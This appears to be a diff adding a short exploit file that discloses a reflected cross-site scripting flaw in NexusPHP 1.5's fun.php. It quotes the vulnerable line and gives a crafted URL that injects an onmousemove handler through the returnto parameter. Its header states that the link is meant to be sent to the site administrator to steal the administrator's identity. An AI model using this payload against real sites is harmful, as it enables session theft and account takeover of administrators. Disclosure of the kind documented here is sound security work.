@@ -1,0 +1,17 @@
+# by yangchonghui
+
+'''
+	Send URL to the web administrator to complete the attack,get the administrator's identity
+
+	Source:
+		fun.php:26
+					stderr($lang_fun['std_delete_fun'],$lang_fun['text_please_click'] ."<a class=altlink href=?action=delete&id=$id&returnto=$returnto&sure=1>".$lang_fun['text_here_if_sure'],false);
+	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+http://localhost/fun.php?action=delete&returnto=1%20onmousemove=alert(1)%20alt=&id=1&sure=1
